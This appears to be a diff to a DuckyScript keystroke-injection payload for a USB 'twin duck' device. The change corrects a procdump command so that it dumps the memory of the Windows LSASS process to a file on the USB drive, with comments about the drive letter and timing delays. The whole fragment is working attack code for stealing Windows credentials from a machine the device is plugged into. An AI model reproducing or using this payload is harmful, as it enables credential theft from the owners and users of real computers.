@@ -23,7 +23,7 @@ REM Create a dump file
 REM Change D: by the letter that will be assigned to the twin duck drive. If you are not sure, leave it on D:, is very common to mount USB drives with that letter. 
 STRING D:
 ENTER
-STRING procdump.exe -accepteula -ma procdump.exe lsass.dmp
+STRING procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ENTER
 REM the time depends of the machine, some take 1 second and some 10, I will choose 5.
 DELAY 5000
